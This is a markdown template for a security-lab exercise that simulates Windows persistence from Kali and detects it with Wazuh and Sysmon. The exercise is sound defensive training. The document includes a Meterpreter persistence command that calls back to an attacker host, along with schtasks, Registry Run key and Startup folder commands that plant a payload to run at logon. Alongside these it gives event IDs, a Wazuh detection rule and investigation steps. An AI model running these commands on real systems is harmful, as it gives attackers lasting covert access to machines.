# 🔗 Attack 04 – Persistence Mechanism (Windows Endpoint)

## Attack Overview

| Field | Details |
|---|---|
| **Attack Name** | Persistence via Scheduled Task / Registry Run Key |
| **Target** | Windows 10 Endpoint (WIN-ENDPOINT) |
| **Attacker** | Kali Linux (192.168.x.x) |
| **MITRE Tactic** | Persistence |
| **MITRE Technique** | T1053.005 – Scheduled Task, T1547.001 – Registry Run Keys |
| **Severity** | High |
| **Date Performed** | YYYY-MM-DD |

## Objective

To simulate adversary persistence techniques on the Windows endpoint by creating scheduled tasks and registry run keys, testing Wazuh and Sysmon's capability to detect persistence mechanisms that allow an attacker to maintain access across reboots.

## Lab Environment

| Machine | Role | IP Address | OS |
|---|---|---|---|
| Kali Linux | Attacker | `192.168.x.x` | Kali 2025.2 |
| WIN-ENDPOINT | Target/Victim | `192.168.x.x` | Windows 10 |
| Wazuh Server | SIEM/Monitor | `192.168.x.x` | Ubuntu Server 26.04 |

## Attack Diagram

```
┌──────────────┐      Initial Access       ┌──────────────────┐
│  Kali Linux  │ ───────────────────────▶  │  WIN-ENDPOINT    │
│  (Attacker)  │                            │  (Victim)        │
└──────────────┘                            │                  │
                                            │  ┌────────────┐  │
                                            │  │ Sched Task │  │
                                            │  │ Registry   │  │
                                            │  │ Run Key    │  │
                                            │  └─────┬──────┘  │
                                            └────────┼─────────┘
                                                     │ Persistence Logs
                                                     ▼
                                            ┌──────────────────┐
                                            │  Wazuh Server    │
                                            └──────────────────┘
```

## Kali Commands Used

```bash
# If using Meterpreter session
meterpreter> run persistence -h
meterpreter> run persistence -U -i 30 -p 4444 -r <KALI_IP>
```

**On Target (simulated persistence commands):**
```powershell
# Create Scheduled Task for persistence
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM

# Registry Run Key persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemUpdate" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# Startup Folder persistence
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# WMI Event Subscription (advanced)
# Documented for reference
```

## Screenshots

| Screenshot | Description |
|---|---|
| `screenshots/win-attack04-schtask-creation.png` | Scheduled task creation |
| `screenshots/win-attack04-registry-key.png` | Registry run key added |
| `screenshots/win-attack04-sysmon-event12.png` | Sysmon registry event |
| `screenshots/win-attack04-wazuh-alert.png` | Wazuh persistence alert |

## Endpoint Evidence

**Windows Event Log:**
```
Event ID: 4698 (Scheduled Task Created)
Event ID: 4699 (Scheduled Task Deleted)
Event ID: 4702 (Scheduled Task Updated)
```

## Wazuh Alerts

| Alert ID | Rule ID | Description | Level | Timestamp |
|---|---|---|---|---|
| <!-- ID --> | <!-- Rule --> | Scheduled task created | <!-- Level --> | <!-- Time --> |
| <!-- ID --> | <!-- Rule --> | Registry run key modified | <!-- Level --> | <!-- Time --> |

## Relevant Event IDs

| Event ID | Source | Description | Relevance |
|---|---|---|---|
| 4698 | Windows Security | Scheduled Task Created | Direct evidence of persistence |
| 12 | Sysmon | Registry Object Added/Deleted | Registry key creation |
| 13 | Sysmon | Registry Value Set | Registry value modification |
| 11 | Sysmon | File Created | Payload file dropped |
| 1 | Sysmon | Process Creation | schtasks.exe / reg.exe execution |

## Sysmon Events

```xml
<Event>
  <System><EventID>13</EventID></System>
  <EventData>
    <Data Name="TargetObject">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdate</Data>
    <Data Name="Details">C:\Windows\Temp\payload.exe</Data>
  </EventData>
</Event>
```

## Log Analysis

1. **Finding 1:** <!-- Scheduled task creation details -->
2. **Finding 2:** <!-- Registry modification details -->
3. **Finding 3:** <!-- File system changes (payload dropped) -->

## MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Persistence |
| **Technique ID** | T1053.005 / T1547.001 |
| **Technique Name** | Scheduled Task / Registry Run Keys |
| **Procedure** | Adversary created a scheduled task and registry run key to execute a payload on logon, maintaining persistent access |
| **Detection Opportunity** | Monitor Sysmon Event 12/13 for modifications to Run/RunOnce keys; monitor Event 4698 for new scheduled tasks |

## Detection Logic

```xml
<rule id="100004" level="10">
  <if_sid>61613</if_sid>
  <field name="win.eventdata.targetObject" type="pcre2">CurrentVersion\\Run</field>
  <description>Registry Run key modified - possible persistence mechanism</description>
  <mitre>
    <id>T1547.001</id>
  </mitre>
</rule>
```

## Investigation Process

1. **Alert Triage:** Wazuh alerted on registry modification / scheduled task creation
2. **Artifact Analysis:** Examined the payload path and scheduled task parameters
3. **Process Context:** Identified which process created the persistence mechanism
4. **File Analysis:** Checked if the referenced payload file exists and its properties
5. **Timeline:** Correlated persistence creation with initial access timeline
6. **Verdict:** Confirmed adversary persistence mechanism established

## Findings

| # | Finding | Severity | Evidence |
|---|---|---|---|
| 1 | <!-- Finding --> | <!-- High --> | <!-- Evidence --> |
| 2 | <!-- Finding --> | <!-- High --> | <!-- Evidence --> |

## Lessons Learned

- <!-- Monitoring gaps for persistence mechanisms -->
- <!-- Sysmon vs native Windows event coverage -->
- <!-- Autorun analysis tools and techniques -->
- <!-- Remediation steps for persistence removal -->

---

> 📌 **Status:** 📝 Template — Update with actual findings after performing the attack simulation.
